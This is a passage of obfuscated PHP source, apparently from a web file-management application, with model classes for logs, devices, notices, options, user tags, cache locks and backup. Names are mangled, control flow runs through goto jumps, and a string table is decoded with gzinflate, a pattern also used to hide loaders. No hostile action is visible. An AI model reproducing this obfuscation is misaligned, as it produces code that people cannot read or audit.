if ($b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[29]] == $B±Ë’Ìõ…ó[529]) { $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[440]][$B±Ë’Ìõ…ó[1056]]; $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[440]][$B±Ë’Ìõ…ó[1057]]; } goto e¸§àæ¸¢Ü; e¸§àæ¸¢Ü: if ($b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[29]] == $B±Ë’Ìõ…ó[1915]) { $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[440]][$B±Ë’Ìõ…ó[404]]; } goto e²¢ÙÀø·¬; e²¢ÙÀø·¬: } if (!$Aì‚Á‘éáø) { return array(); } return Model($B±Ë’Ìõ…ó[799])->sourceListInfo($Aì‚Á‘éáø, !0); } private function logList($dï‡”˜‹ß´) { goto fÊàÖšõÖ; fÊàÖšõÖ: $Fïì­…¡åë =& $_SERVER[«¾°Ã¤]; $BÃ‡ìèà‰ = array_to_keyvalue($dï‡”˜‹ß´, $Fïì­…¡åë[33], $Fïì­…¡åë[1529]); $A¸‚ä«·÷ë = Model($Fïì­…¡åë[515])->userListInfo(array_unique($BÃ‡ìèà‰)); goto d¬±ÖäÓ¥˜; d¬±ÖäÓ¥˜: $d¯¬ÃÍ‹Ë¼ = $this->getSourceList($dï‡”˜‹ß´); $fà›à¹…– = $this->typeAll(); $F¹Ò¸”Ê³ = array(); goto cÕ‹¨çÏé³; a¤³Ş—âõ: return $F¹Ò¸”Ê³; goto BßÏ“¤ÊÎœ; cÕ‹¨çÏé³: $E‚‰¦ƒ¬ƒ— = array(); foreach ($dï‡”˜‹ß´ as $Dì¬˜İ™Ö => $eåó›˜³Û) { goto A´ğŠ´©™à; A‚Ç¼™•Ñ‰: $this->ipAddress($eåó›˜³Û); if (strpos($DÛÉØí‰ëõ, $Fïì­…¡åë[1908]) === 0 || isset($FÚ˜Ã«‰[$Fïì­…¡åë[1907]])) { goto Cš¢ƒ’À; Bõ¦Ã…­ÖÅ: if ($FÚ˜Ã«‰[$Fïì­…¡åë[29]] == $Fïì­…¡åë[1915]) { $FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[404]] = $d¯¬ÃÍ‹Ë¼[$FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[404]]]; } if ($FÚ˜Ã«‰[$Fïì­…¡åë[29]] == $Fïì­…¡åë[1659]) { $FÚ˜Ã«‰[$Fïì­…¡åë[1920]] = $FÚ˜Ã«‰[$Fïì­…¡åë[85]]; $FÚ˜Ã«‰[$Fïì­…¡åë[1907]] = $FÚ˜Ã«‰[$Fïì­…¡åë[1920]][$Fïì­…¡åë[404]]; $FÚ˜Ã«‰[$Fïì­…¡åë[85]] = !1; $FÚ˜Ã«‰[$Fïì­…¡åë[404]] = $Fïì­…¡åë[33]; } if ($FÚ˜Ã«‰[$Fïì­…¡åë[85]] && $FÚ˜Ã«‰[$Fïì­…¡åë[85]][$Fïì­…¡åë[413]] == $Fïì­…¡åë[1172]) { $E‚‰¦ƒ¬ƒ—[] = $eåó›˜³Û[$Fïì­…¡åë[393]]; unset($dï‡”˜‹ß´[$Dì¬˜İ™Ö]); continue; } goto Fºè’óì; Cš¢ƒ’À: $FÚ˜Ã«‰[$Fïì­…¡åë[85]] = $d¯¬ÃÍ‹Ë¼[$FÚ˜Ã«‰[$Fïì­…¡åë[404]]]; $FÚ˜Ã«‰[$Fïì­…¡åë[1920]] = $d¯¬ÃÍ‹Ë¼[$FÚ˜Ã«‰[$Fïì­…¡åë[1907]]]; if ($FÚ˜Ã«‰[$Fïì­…¡åë[29]] == $Fïì­…¡åë[529]) { $FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[1056]] = $d¯¬ÃÍ‹Ë¼[$FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[1056]]]; $FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[1057]] = $d¯¬ÃÍ‹Ë¼[$FÚ˜Ã«‰[$Fïì­…¡åë[440]][$Fïì­…¡åë[1057]]]; } goto Bõ¦Ã…­ÖÅ; Fºè’óì: if ($FÚ˜Ã«‰[$Fïì­…¡åë[1920]] && $FÚ˜Ã«‰[$Fïì­…¡åë[1920]][$Fïì­…¡åë[413]] == $Fïì­…¡åë[1172]) { $E‚‰¦ƒ¬ƒ—[] = $eåó›˜³Û[$Fïì­…¡åë[393]]; unset($dï‡”˜‹ß´[$Dì¬˜İ™Ö]); continue; } goto Aé‹«çÎ…ï; Aé‹«çÎ…ï: } $eåó›˜³Û[$Fïì­…¡åë[440]] = $FÚ˜Ã«‰; goto b¨ùÚõ—È; b¿ˆßö¸áŠ: $eåó›˜³Û[$Fïì­…¡åë[1850]] = $EÁÁ’ĞùÕ; $FÚ˜Ã«‰ = json_decode($eåó›˜³Û[$Fïì­…¡åë[440]], !0); $eåó›˜³Û[$Fïì­…¡åë[2091]] = isset($FÚ˜Ã«‰[$Fïì­…¡åë[2091]]) ? $FÚ˜Ã«‰[$Fïì­…¡åë[2091]] : $Fïì­…¡åë[33]; goto A‚Ç¼™•Ñ‰; b¨ùÚõ—È: unset($eåó›˜³Û[$Fïì­…¡åë[2100]]); $F¹Ò¸”Ê³[] = $eåó›˜³Û; goto EµÏâ‡—§; eê½·¹ˆÛœ: $eåó›˜³Û[$Fïì­…¡åë[28]] = isset($EÁÁ’ĞùÕ[$Fïì­…¡åë[28]]) ? $EÁÁ’ĞùÕ[$Fïì­…¡åë[28]] : LNG($Fïì­…¡åë[2094]); $eåó›˜³Û[$Fïì­…¡åë[1957]] = isset($EÁÁ’ĞùÕ[$Fïì­…¡åë[1957]]) ? $EÁÁ’ĞùÕ[$Fïì­…¡åë[1957]] : $Fïì­…¡åë[33]; $eåó›˜³Û[$Fïì­…¡åë[1434]] = isset($fà›à¹…–[$DÛÉØí‰ëõ]) ? $fà›à¹…–[$DÛÉØí‰ëõ] : $eÖ©„‚Á‚; goto b¿ˆßö¸áŠ; A´ğŠ´©™à: $DÛÉØí‰ëõ = $eåó›˜³Û[$Fïì­…¡åë[29]]; $EÁÁ’ĞùÕ = isset($A¸‚ä«·÷ë[$eåó›˜³Û[$Fïì­…¡åë[1529]]]) ? $A¸‚ä«·÷ë[$eåó›˜³Û[$Fïì­…¡åë[1529]]] : !1; $eÖ©„‚Á‚ = strpos($DÛÉØí‰ëõ, $Fïì­…¡åë[2098]) === 0 ? LNG($Fïì­…¡åë[2099]) : LNG($Fïì­…¡åë[2094]); goto eê½·¹ˆÛœ; EµÏâ‡—§: } $this->clearSystemPathLog($E‚‰¦ƒ¬ƒ—); goto a¤³Ş—âõ; BßÏ“¤ÊÎœ: } private function clearSystemPathLog($F…ÂÓÕŒÔ) { $Eóôßé‚ =& $_SERVER[«¾°Ã¤]; if (count($F…ÂÓÕŒÔ) == 0) { return; } $fÎÔ¾ğ—µš = array($Eóôßé‚[393] => array($Eóôßé‚[7], array_unique($F…ÂÓÕŒÔ))); $this->where($fÎÔ¾ğ—µš)->delete(); } public function deviceList($E÷à·©óË, $a‚Ü ò’ö† = 0) { $C§Ï´ª—íŠ =& $_SERVER[«¾°Ã¤]; $fÊ¿…¬ˆ© = array($C§Ï´ª—íŠ[1529] => $E÷à·©óË, $C§Ï´ª—íŠ[194] => array($C§Ï´ª—íŠ[972], $a‚Ü ò’ö†), $C§Ï´ª—íŠ[29] => $C§Ï´ª—íŠ[1633]); $aŒó—¡Û‘“ = array(); $aèÇ‰¯—Ş = $this->field($C§Ï´ª—íŠ[2101])->where($fÊ¿…¬ˆ©)->order($C§Ï´ª—íŠ[1918])->limit(50)->select(); foreach ($aèÇ‰¯—Ş as $EòáªÀÜ => $d­Œƒ³ùŒš) { goto eô”ä¿Œ¯ß; eô”ä¿Œ¯ß: if ($EòáªÀÜ > 0 && abs($d­Œƒ³ùŒš[$C§Ï´ª—íŠ[194]] - $aèÇ‰¯—Ş[$EòáªÀÜ - 1][$C§Ï´ª—íŠ[194]]) < 5) { continue; } $c·Îˆøî = json_decode($d­Œƒ³ùŒš[$C§Ï´ª—íŠ[440]], !0); $d­Œƒ³ùŒš[$C§Ï´ª—íŠ[2091]] = isset($c·Îˆøî[$C§Ï´ª—íŠ[2091]]) ? $c·Îˆøî[$C§Ï´ª—íŠ[2091]] : $C§Ï´ª—íŠ[33]; goto Dˆ‘š§„ö¿; aëëÁè‰è¸: $this->ipAddress($d­Œƒ³ùŒš); $d­Œƒ³ùŒš[$C§Ï´ª—íŠ[440]] = $c·Îˆøî; $aŒó—¡Û‘“[$aåòˆéŒ²] = $d­Œƒ³ùŒš; goto F˜õø›ã˜; Dˆ‘š§„ö¿: unset($c·Îˆøî[$C§Ï´ª—íŠ[2091]]); $aåòˆéŒ² = $this->deviceType($c·Îˆøî[$C§Ï´ª—íŠ[1909]]); if (isset($aŒó—¡Û‘“[$aåòˆéŒ²])) { continue; } goto aëëÁè‰è¸; F˜õø›ã˜: } return array_values($aŒó—¡Û‘“); } public function deviceType($aáéƒÊ‚ßÂ) { return $aáéƒÊ‚ßÂ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x6e\157\x74\151\x63\145\114\151\163\164"; public $field = array("\156\141\155\x65", "\x63\157\x6e\164\145\156\x74", "\141\x75\164\x68", "\x6d\157\x64\145", "\164\151\155\x65", "\x74\171\x70\145", "\154\x65\166\x65\154", "\145\x6e\x61\x62\154\x65", "\163\157\x72\x74"); public function listData($EÔ…–½ƒƒ = false, $d»áËæ¬ = "\x73\x6f\162\164", $dÌ­•£‡Ã÷ = false) { return parent::listData($EÔ…–½ƒƒ, $d»áËæ¬, $dÌ­•£‡Ã÷); } public function add($c“šğ¼À) { $DíºÈº¸¥Ã =& $_SERVER[«¾°Ã¤]; $f®İˆÕĞ¾ = time(); if ($c“šğ¼À[$DíºÈº¸¥Ã[12]] == $DíºÈº¸¥Ã[2102]) { $f®İˆÕĞ¾ = strtotime($c“šğ¼À[$DíºÈº¸¥Ã[197]]); } $c“šğ¼À[$DíºÈº¸¥Ã[197]] = $f®İˆÕĞ¾; return parent::insert($c“šğ¼À); } public function update($b¸´­åå, $Fİ°ĞÊŞ¹Ê) { goto D‹ˆ…ºø¥; C×Ò‘ÉÀ‰: $Bé½ÄÔ™¨ = time(); if ($Fİ°ĞÊŞ¹Ê[$aò†°‡ƒõç[12]] == $aò†°‡ƒõç[2102]) { $Bé½ÄÔ™¨ = strtotime($Fİ°ĞÊŞ¹Ê[$aò†°‡ƒõç[197]]); } $Fİ°ĞÊŞ¹Ê[$aò†°‡ƒõç[197]] = $Bé½ÄÔ™¨; goto Cˆø‰¨°Å; D‹ˆ…ºø¥: $aò†°‡ƒõç =& $_SERVER[«¾°Ã¤]; $fà½Šğ‰˜ê = $this->listData($b¸´­åå); if (!$fà½Šğ‰˜ê) { return !1; } goto C×Ò‘ÉÀ‰; Cˆø‰¨°Å: return parent::update($b¸´­åå, $Fİ°ĞÊŞ¹Ê); goto a°í´‘‡Ÿ; a°í´‘‡Ÿ: } public function remove($AÊÕ À†¾Ì) { $aÆàš¢«¾˜ = $this->listData($AÊÕ À†¾Ì); if (!$aÆàš¢«¾˜ || $aÆàš¢«¾˜[$_SERVER[«¾°Ã¤][1172]]) { return !1; } return parent::remove($AÊÕ À†¾Ì); } public function sort($F¦×®äìá, $C†˜æì†œñ) { return parent::update($F¦×®äìá, $C†˜æì†œñ); } public function enable($dÊÖ‡âæ†, $fó¡ï‘ˆ÷â) { return parent::update($dÊÖ‡âæ†, array($_SERVER[«¾°Ã¤][2103] => $fó¡ï‘ˆ÷â)); } private function initUserOption() { $f¨¥×Ú¹°‚ =& $_SERVER[«¾°Ã¤]; $this->optionType = $f¨¥×Ú¹°‚[2104]; $this->modelType = $f¨¥×Ú¹°‚[2105]; $this->field = array($f¨¥×Ú¹°‚[2106], $f¨¥×Ú¹°‚[28], $f¨¥×Ú¹°‚[197], $f¨¥×Ú¹°‚[29], $f¨¥×Ú¹°‚[2107], $f¨¥×Ú¹°‚[719], $f¨¥×Ú¹°‚[189]); } public function userNoticeGet($FŸ—¿ßä«± = false) { $this->initUserOption(); return parent::listData($FŸ—¿ßä«±, $_SERVER[«¾°Ã¤][393], !0); } public function userNoticeAdd($C²“â‡’Îà) { $b¤ï¤Ü…ä… =& $_SERVER[«¾°Ã¤]; $this->initUserOption(); $b ¬­®ºä£ = $this->findByKey($b¤ï¤Ü…ä…[2106], $C²“â‡’Îà[$b¤ï¤Ü…ä…[393]]); if ($b ¬­®ºä£) { return !0; } $A£ô´±Ÿ¸ = array($b¤ï¤Ü…ä…[2106] => $C²“â‡’Îà[$b¤ï¤Ü…ä…[393]], $b¤ï¤Ü…ä…[28] => $C²“â‡’Îà[$b¤ï¤Ü…ä…[28]], $b¤ï¤Ü…ä…[197] => $C²“â‡’Îà[$b¤ï¤Ü…ä…[197]], $b¤ï¤Ü…ä…[29] => isset($C²“â‡’Îà[$b¤ï¤Ü…ä…[29]]) ? $C²“â‡’Îà[$b¤ï¤Ü…ä…[29]] : 1, $b¤ï¤Ü…ä…[2107] => isset($C²“â‡’Îà[$b¤ï¤Ü…ä…[2107]]) ? $C²“â‡’Îà[$b¤ï¤Ü…ä…[2107]] : 0, $b¤ï¤Ü…ä…[719] => 0, $b¤ï¤Ü…ä…[189] => 0); return parent::insert($A£ô´±Ÿ¸); } public function userNoticeEdit($Cğµé«»šÚ, $EñÒì˜äÀÅ) { $this->initUserOption(); return parent::update($Cğµé«»šÚ, $EñÒì˜äÀÅ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\155\137\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\x6c\x65", "\x72\157\154\x65\107\x72\x6f\165\x70", "\x72\x65\147\151\x73\164", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($cŞ»˜Õß±¨) { return "\x53\171\163\x74\x65\x6d\x4f\x70\x74\151\x6f\x6e\x5f{$cŞ»˜Õß±¨}"; } protected function optionDefault($C†ñ£á°¸¦ = '') { $Aë™‹‰˜’³ =& $_SERVER[«¾°Ã¤]; if ($C†ñ£á°¸¦ == $Aë™‹‰˜’³[33]) { return $GLOBALS[$Aë™‹‰˜’³[6]][$Aë™‹‰˜’³[378]]; } } } goto E¤ÎÄ¥ ¹Ë; C§¨¥ÍÄÜ: class CacheLockRedis { public function lock($aˆ¾¾Úõ¢, $dÉ¨¯®¾¤ = 10) { $CøÓİšˆË = Cache::init(); $c—çÄİ‘² = microtime(!0) + $dÉ¨¯®¾¤; while (microtime(!0) < $c—çÄİ‘²) { $bßÑ­³æ‰ = $CøÓİšˆË->get($aˆ¾¾Úõ¢); if (!$bßÑ­³æ‰) { $EÍÏ°²®ãµ = $CøÓİšˆË->setLock($aˆ¾¾Úõ¢, $c—çÄİ‘², $dÉ¨¯®¾¤); if ($EÍÏ°²®ãµ) { return !0; } } else { if ($bßÑ­³æ‰ < microtime(!0)) { $CøÓİšˆË->set($aˆ¾¾Úõ¢, $c—çÄİ‘², $dÉ¨¯®¾¤ * 2); if ($CøÓİšˆË->get($aˆ¾¾Úõ¢) === $bßÑ­³æ‰) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($e­×§Ú»ã) { return Cache::init()->get($e­×§Ú»ã); } public function unlock($Aªó‡ÈÛ”‡) { return Cache::init()->remove($Aªó‡ÈÛ”‡); } } class CacheLockMemcached { public function lock($aÖÍˆ„¬ğ, $b«ÉèÂ×¬Ô = 0) { $dÊ’Ğ“ô‘ = Cache::init(); $FñÍà”× = microtime(!0) + $b«ÉèÂ×¬Ô; while (microtime(!0) < $FñÍà”×) { $f…ø‘‡¦˜ = $dÊ’Ğ“ô‘->get($aÖÍˆ„¬ğ); if (!$f…ø‘‡¦˜ || $f…ø‘‡¦˜ < microtime(!0)) { $f‘×Ó‡ÊÎ = $dÊ’Ğ“ô‘->handle->add($aÖÍˆ„¬ğ, $FñÍà”×, $b«ÉèÂ×¬Ô); if ($f‘×Ó‡ÊÎ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F‰Áœ‚ŞáŒ) { return Cache::init()->get($F‰Áœ‚ŞáŒ); } public function unlock($f¨òÎáª¬È) { return Cache::init()->remove($f¨òÎáª¬È); } } class CacheLockDatabase { public function lock($dùŒŸ‹”æ–, $AóÑòİŒÌË = 0) { $DÑ‘ĞÜä˜ = Model($_SERVER[«¾°Ã¤][803]); $fğï—öÆ = microtime(!0) + $AóÑòİŒÌË; while (microtime(!0) < $fğï—öÆ) { $aêÌÚÃ¯í = $DÑ‘ĞÜä˜->get($dùŒŸ‹”æ–); if (!$aêÌÚÃ¯í || $aêÌÚÃ¯í < microtime(!0)) { $fŸ†…ï… = $DÑ‘ĞÜä˜->set($dùŒŸ‹”æ–, $fğï—öÆ); if ($fŸ†…ï…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bí—Èâôœ) { return Model($_SERVER[«¾°Ã¤][803])->get($Bí—Èâôœ); } public function unlock($dÛÅ¤í±ã) { Model($_SERVER[«¾°Ã¤][803])->remove($dÛÅ¤í±ã); } } goto fÇ¢•ªÊØ¿; CŠ¸íà„¡: define($_SERVER[«¾°Ã¤][237], 2); define($_SERVER[«¾°Ã¤][238], 3); define($_SERVER[«¾°Ã¤][239], 1); goto F‹˜Ş¡Ä¯â; A·¯£‰ÍÙô: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f‘¤Â…¯º) { $b¶—÷”‘ô =& $_SERVER[«¾°Ã¤]; if (!defined($b¶—÷”‘ô[463])) { define($b¶—÷”‘ô[463], 0); } return "\x55\x73\x65\162\x4f\160\x74\x69\157\x6e\x5f{$f‘¤Â…¯º}\x5f" . USER_ID; } protected function filterWhere($fØÕé§Šë£) { $e¡¨ÄºÄ— =& $_SERVER[«¾°Ã¤]; if (!defined($e¡¨ÄºÄ—[463])) { define($e¡¨ÄºÄ—[463], 0); } $fØÕé§Šë£[$e¡¨ÄºÄ—[1529]] = USER_ID; return $fØÕé§Šë£; } public function cacheRemoveUser($DÖ©Æ‡»è, $d»»åù™) { return Cache::remove("\x55\163\x65\162\117\160\164\x69\x6f\156\137{$DÖ©Æ‡»è}\137" . $d»»åù™); } protected function optionDefault($e®ìÕÈ ¼ö = '') { $e¼ã‘…ª†É =& $_SERVER[«¾°Ã¤]; if ($e®ìÕÈ ¼ö == $e¼ã‘…ª†É[33]) { return $GLOBALS[$e¼ã‘…ª†É[6]][$e¼ã‘…ª†É[2163]]; } if ($e®ìÕÈ ¼ö == $e¼ã‘…ª†É[2164]) { return $GLOBALS[$e¼ã‘…ª†É[6]][$e¼ã‘…ª†É[2165]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\164\x61\x67\114\151\x73\164"; public $modelType = "\125\x73\x65\162\x4f\160\164\x69\157\156"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\171\154\x65", "\x73\x6f\162\x74"); public function listData($DŸ¼¹Åˆ› = false, $EæÒÕ³øáˆ = "\x73\157\x72\x74", $Fã·¢ÅÌÆ = false) { return parent::listData($DŸ¼¹Åˆ›, $EæÒÕ³øáˆ, $Fã·¢ÅÌÆ); } public function remove($B‰¤ÂõæÈ) { return parent::remove($B‰¤ÂõæÈ); } public function add($cĞÁĞŸãŒ¯, $E¡„Á£Ø¥ = "\x6c\x61\x62\x65\x6c\x2d\147\162\x65\171\x2d\x6e\x6f\x72\x6d\x61\154") { $bùğŞÒÏÚœ =& $_SERVER[«¾°Ã¤]; if ($this->findByName($cĞÁĞŸãŒ¯)) { return !1; } $e­ëäôèï = array($bùğŞÒÏÚœ[422] => $cĞÁĞŸãŒ¯, $bùğŞÒÏÚœ[473] => $E¡„Á£Ø¥, $bùğŞÒÏÚœ[1697] => $this->getSort($bùğŞÒÏÚœ[256]) + 1); return parent::insert($e­ëäôèï); } public function update($C¶„Ÿ±Éš, $Bõ‹‚¼ù‘ù) { $AïÙòôùÔ =& $_SERVER[«¾°Ã¤]; $Eî©½ñã¶£ = $this->listData($C¶„Ÿ±Éš); $fğ…ŒØê·ò = $this->findByName($Bõ‹‚¼ù‘ù[$AïÙòôùÔ[28]]); if (!$Eî©½ñã¶£ || $fğ…ŒØê·ò && $fğ…ŒØê·ò[$AïÙòôùÔ[393]] != $Eî©½ñã¶£[$AïÙòôùÔ[393]]) { return !1; } return parent::update($C¶„Ÿ±Éš, $Bõ‹‚¼ù‘ù); } public function moveTop($eÉ¥¾‰„¡ó) { $d½”ÔãÙÁ¦ =& $_SERVER[«¾°Ã¤]; $d‚±´ö‰ğÈ = parent::listData(); $Fš¤ĞëâÅÁ = $this->getSort($d½”ÔãÙÁ¦[255]); foreach ($d‚±´ö‰ğÈ as &$aŒ¯ñ¢Ñ…) { if ($aŒ¯ñ¢Ñ…[$d½”ÔãÙÁ¦[393]] == $eÉ¥¾‰„¡ó) { $aŒ¯ñ¢Ñ…[$d½”ÔãÙÁ¦[1716]] = $Fš¤ĞëâÅÁ; continue; } $aŒ¯ñ¢Ñ…[$d½”ÔãÙÁ¦[1716]] += 1; } unset($aŒ¯ñ¢Ñ…); return parent::resetData($d‚±´ö‰ğÈ); } public function moveBottom($BÏøùÍñ) { $e¼ë¤Óâã´ =& $_SERVER[«¾°Ã¤]; $Cù÷ù‹¥ŠÒ = $this->getSort($e¼ë¤Óâã´[256]) + 1; return parent::update($BÏøùÍñ, array($e¼ë¤Óâã´[1716] => $Cù÷ù‹¥ŠÒ)); } public function resetSort($añ–Ú…±ñ) { goto f×À”õì®; cÁ¬äÁìŞÃ: unset($aô¹õ„Ú…); return parent::resetData($bˆˆ‘ëËÔò); goto cæ‹Ä½Ä¨³; f×À”õì®: $d°ß¨ªË´ =& $_SERVER[«¾°Ã¤]; $BÜ¢ÎŸğŒ© = array(); $añ–Ú…±ñ = is_array($añ–Ú…±ñ) ? $añ–Ú…±ñ : array(); goto dŞ±Ì‘œ¤; dŞ±Ì‘œ¤: for ($bÃğˆ‡²¦ = 0; $bÃğˆ‡²¦ < count($añ–Ú…±ñ); $bÃğˆ‡²¦++) { $BÜ¢ÎŸğŒ©[$añ–Ú…±ñ[$bÃğˆ‡²¦] . $d°ß¨ªË´[33]] = $bÃğˆ‡²¦ + 1; } $bˆˆ‘ëËÔò = parent::listData(); foreach ($bˆˆ‘ëËÔò as &$aô¹õ„Ú…) { $Eğï„Äç£ = $BÜ¢ÎŸğŒ©[$aô¹õ„Ú…[$d°ß¨ªË´[393]]]; $aô¹õ„Ú…[$d°ß¨ªË´[1716]] = $Eğï„Äç£ ? $Eğï„Äç£ : $aô¹õ„Ú…[$d°ß¨ªË´[1716]]; } goto cÁ¬äÁìŞÃ; cæ‹Ä½Ä¨³: } private function getSort($AÄ¹ë¢”ö) { $DœˆÙ•®Œ† =& $_SERVER[«¾°Ã¤]; $e¾ŠÊ¿¤ôì = parent::listData(); $DÖçæŠÁÔ = array_to_keyvalue($e¾ŠÊ¿¤ôì, $DœˆÙ•®Œ†[33], $DœˆÙ•®Œ†[1716]); if (!$DÖçæŠÁÔ) { $DÖçæŠÁÔ = array(0); } $dÆ÷è–ÕÈî = $AÄ¹ë¢”ö == $DœˆÙ•®Œ†[256] ? max($DÖçæŠÁÔ) : min($DÖçæŠÁÔ); return intval($dÆ÷è–ÕÈî); } } goto B“°áøŒä; F‰¸Ò“Šñ: $Fº­òó²‡ = $_SERVER[«¾°Ã¤][583]; if (!$Fº­òó²‡) { return; } $_SERVER[¿] = explode($_SERVER[«¾°Ã¤][584], gzinflate(substr($_SERVER[«¾°Ã¤][585], 10, -8))); goto Cƒ¯¥¨¬½å; e®«©É”Ç·: class BackupFile { public function __construct() { } public function index() { goto dô©Å¨ˆä½; a¸—ïæ¨Ï: $C‘ÜƒÃÄÀÍ = array($_SERVER[«¾°Ã¤][797] => 1, $_SERVER[«¾°Ã¤][485] => time(), $_SERVER[«¾°Ã¤][744] => 1, $_SERVER[«¾°Ã¤][794] => $aÑŒ»³¶›Ô, $_SERVER[«¾°Ã¤][786] => $C©Œ‘‹Õ¾ä, $_SERVER[«¾°Ã¤][785] => $e‹òå´““Í, $_SERVER[«¾°Ã¤][798] => time()); if ($F´…°Ü”ºŞ) { $C‘ÜƒÃÄÀÍ[$_SERVER[«¾°Ã¤][795]] = $e——ÆÖè; $C‘ÜƒÃÄÀÍ[$_SERVER[«¾°Ã¤][796]] = $FÂİ»‘ª; } Backup::set($C‘ÜƒÃÄÀÍ); goto E‹¦Ğ¸Ç…å; e•Äï¤æÓ: $F¾öá¬Ä = !0; $dˆ®Ç¢ÖÀİ = $this->storeIds(); $cšÈÃè„íÒ = 1; goto b¤½ŸñÎ; f‹¢à’ò™Î: $c¿’ÈŠ->task[$_SERVER[«¾°Ã¤][732]] = $C©Œ‘‹Õ¾ä; $C‘ÜƒÃÄÀÍ = array($_SERVER[«¾°Ã¤][785] => $e‹òå´““Í, $_SERVER[«¾°Ã¤][786] => $C©Œ‘‹Õ¾ä, $_SERVER[«¾°Ã¤][787] => time()); Backup::set($C‘ÜƒÃÄÀÍ); goto e•Äï¤æÓ; dô©Å¨ˆä½: $aÂ‰‚„¯° = Backup::get(); $aÑŒ»³¶›Ô = $aÂ‰‚„¯°[$_SERVER[«¾°Ã¤][291]][$_SERVER[«¾°Ã¤][193]][$_SERVER[«¾°Ã¤][456]]; $B‰Šğ‡Î¾ = array($_SERVER[«¾°Ã¤][457] => array($_SERVER[«¾°Ã¤][781], $aÑŒ»³¶›Ô), $_SERVER[«¾°Ã¤][782] => array($_SERVER[«¾°Ã¤][329], $aÂ‰‚„¯°[$_SERVER[«¾°Ã¤][721]])); goto bâĞ·’ù­…; bâĞ·’ù­…: $e‹òå´““Í = (int) Model($_SERVER[«¾°Ã¤][756])->where($B‰Šğ‡Î¾)->count($_SERVER[«¾°Ã¤][456]); $C©Œ‘‹Õ¾ä = (int) Model($_SERVER[«¾°Ã¤][756])->where($B‰Šğ‡Î¾)->sum($_SERVER[«¾°Ã¤][78]); $c¿’ÈŠ = new TaskFileTransfer($_SERVER[«¾°Ã¤][783], $_SERVER[«¾°Ã¤][751], $e‹òå´““Í, LNG($_SERVER[«¾°Ã¤][752]) . $_SERVER[«¾°Ã¤][753] . LNG($_SERVER[«¾°Ã¤][784])); goto f‹¢à’ò™Î; b¤½ŸñÎ: $b«§Õ‚§š¥ = 1000; $Cº©™Û¼¤¢ = $F´…°Ü”ºŞ = 0; $bšªÈé’‹× = array(); goto D„‹Áª”Ù®; D„‹Áª”Ù®: $FÂİ»‘ª = $e——ÆÖè = 0; do { $Aè¦¥ìöó = $_SERVER[«¾°Ã¤][788]; $CŠÍªÛÚÁ = Model($_SERVER[«¾°Ã¤][756])->where($B‰Šğ‡Î¾)->field($Aè¦¥ìöó)->order($_SERVER[«¾°Ã¤][789])->selectPage($b«§Õ‚§š¥, $cšÈÃè„íÒ); $E¾İ³æÚì¬ = !empty($CŠÍªÛÚÁ[$_SERVER[«¾°Ã¤][367]]) ? $CŠÍªÛÚÁ[$_SERVER[«¾°Ã¤][367]] : array(); foreach ($E¾İ³æÚì¬ as $DÆŠ‡Ş¸™) { goto bˆ»£àÍ; B–’Èçƒ¨Ò: $Cº©™Û¼¤¢ += $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][78]]; $e——ÆÖè += 1; $FÂİ»‘ª += $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][78]]; goto f—ì’‹éùŸ; bˆ»£àÍ: if (!$this->_fileExist($DÆŠ‡Ş¸™, $bšªÈé’‹×, $dˆ®Ç¢ÖÀİ)) { $e‹òå´““Í -= 1; $C©Œ‘‹Õ¾ä -= (int) $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][78]]; write_log("\x66\151\x6c\145\40\156\x6f\x74\x20\145\x78\x69\x73\x74\x2e\x66\x69\154\145\111\104\x3a{$DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][456]]}\x2c\40\x70\x61\x74\150\x3a{$DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][76]]}", $_SERVER[«¾°Ã¤][790]); continue; } $B²Û»¶í¯ = $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][76]]; $dŠ³®œÌî = "\173\x69\157\72{$aÂ‰‚„¯°[$_SERVER[«¾°Ã¤][721]]}\x7d" . substr($B²Û»¶í¯, strlen("\173\x69\x6f\x3a{$DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][791]]}\x7d")); goto c‘—Ñõ§·Ô; f—ì’‹éùŸ: if ($Cº©™Û¼¤¢ >= 1024 * 1024 * 100) { $C‘ÜƒÃÄÀÍ = array($_SERVER[«¾°Ã¤][794] => $aÑŒ»³¶›Ô, $_SERVER[«¾°Ã¤][795] => $e——ÆÖè, $_SERVER[«¾°Ã¤][796] => $FÂİ»‘ª); Backup::set($C‘ÜƒÃÄÀÍ); $Cº©™Û¼¤¢ = $F´…°Ü”ºŞ = 0; } goto cêæğ‘¾ˆÓ; c‘—Ñõ§·Ô: if (IO::exist($dŠ³®œÌî)) { $c¿’ÈŠ->updateFileEnd($DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][28]], $DÆŠ‡Ş¸™[$_SERVER[«¾°Ã¤][78]]); } else { $dŠ³®œÌî = 